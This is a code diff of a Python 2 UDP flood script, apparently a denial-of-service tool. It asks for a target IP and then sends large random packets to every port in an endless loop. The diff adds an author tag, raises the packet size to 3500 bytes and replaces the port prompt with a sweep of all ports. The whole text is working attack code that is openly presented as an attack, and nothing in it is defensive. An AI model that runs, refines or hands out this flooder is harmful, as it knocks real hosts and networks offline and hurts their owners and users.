@@ -1,3 +1,4 @@
+#Author WHITE L'
 import socket, os, random, time
 
 B = '\033[1m'
@@ -5,10 +6,10 @@ R = '\033[31m'
 N = '\033[0m'
 
 white = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-bytes = random._urandom(1490)
+bytes = random._urandom(3500)
 
 os.system("clear")
-print 
+print " "
 print "                              $$\                       $ \                     "         
 print "                              $$ |                      $$ |                    "
 print " $$$$$$\   $$$$$$\   $$$$$$\  $$ | $$$$$$\         $$$$$$$ | $$$$$$\   $$$$$$$\ "
@@ -31,16 +32,14 @@ print("\033[32m================================================================\
 print
 
 ip = raw_input("[+] Target's IP : ")
-port = input('[+] Port: ')
 os.system("clear")
 print "Attack starting..."
 time.sleep(3)
-
-sent = 0
 while True:
-     white.sendto(bytes, (ip,port))
-     sent = sent + 1
-     port = port + 1
-     print "\033[1;91mSend \033[1;32m%s \033[1;91m Packets to \033[1;32m%s \033[1;91mThrough port \033[1;32m%s "%(sent, ip, port)
-     if port == 65534:
-       port = 1
+	sent = 0
+	for port in range(1, 65534):
+    		white.sendto(bytes, (ip,port))
+    		sent = sent + 1
+    		print "\033[1;91mSend \033[1;32m%s \033[1;91m Packets to \033[1;32m%s \033[1;91mThrough port \033[1;32m%s "%(sent, ip, port)
+
+print "\033[1;92mAttack finished\033[0m"
